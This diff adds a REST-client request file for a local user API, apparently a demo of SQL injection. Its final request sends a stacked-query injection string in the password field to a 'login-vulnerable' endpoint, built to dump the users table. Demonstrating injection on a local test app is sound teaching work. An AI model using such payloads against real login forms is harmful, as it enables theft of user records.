@@ -1,0 +1,27 @@
+@host=127.0.0.1:3500
+
+GET http://{{host}}
+
+
+#### get all users
+GET http://{{host}}/users
+
+
+#### login
+post http://{{host}}/users/login
+Content-Type: application/json
+
+{
+  "email": "user1@gmail.com",
+  "password": "password1"
+}
+
+
+#### login vulnerable
+post http://{{host}}/users/login-vulnerable
+Content-Type: application/json
+
+{
+  "email": "user1@gmail.com",
+  "password": "password1'; select * from users; select * from users where email != '"
+}
